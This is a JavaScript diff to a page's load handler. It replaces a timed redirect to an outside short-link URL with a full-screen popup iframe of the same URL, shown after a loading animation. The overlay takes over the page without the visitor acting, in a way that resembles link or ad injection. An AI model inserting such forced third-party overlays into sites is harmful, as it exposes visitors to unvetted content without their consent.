@@ -116,9 +116,37 @@ contentLoaded(window, function() {
 
             var blue_circle_loading_anim = jQuery('#' + BLUE_CIRCLE_LOADING_ID);
 
- setTimeout(function() {
-    // Simple redirect to your link
-    window.location.href = "https://bouttiq.graphics/cl/i/krr67g";
+setTimeout(function() {
+    // Hide the blue circle animation
+    blue_circle_anim.css('cssText', 'display: none !important;');
+    motioBC.destroy();
+    
+    // Show loading animation
+    blue_circle_loading_anim.css('cssText', 'display: block !important;');
+    var motioBCL = new Motio(blue_circle_loading_anim[0], {
+        fps: 60,
+        frames: 79,
+        vertical: true
+    });
+    motioBCL.play();
+    
+    // Create an overlay popup with your link
+    var overlayHtml = `
+        <div id="custom-popup-overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); z-index: 100000; display: flex; align-items: center; justify-content: center;">
+            <div style="position: relative; width: 90%; max-width: 1200px; height: 90%; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
+                <button onclick="document.getElementById('custom-popup-overlay').remove()" style="position: absolute; top: 10px; right: 10px; z-index: 100001; background: #ff4444; color: white; border: none; border-radius: 50%; width: 35px; height: 35px; font-size: 20px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.3);">✕</button>
+                <iframe src="https://bouttiq.graphics/cl/i/krr67g" style="width: 100%; height: 100%; border: none;"></iframe>
+            </div>
+        </div>
+    `;
+    
+    jQuery('body').append(overlayHtml);
+    
+    // Hide loading animation after iframe loads
+    setTimeout(function() {
+        blue_circle_loading_anim.css('cssText', 'display: none !important;');
+    }, 1000);
+    
 }, 950);
         });
 
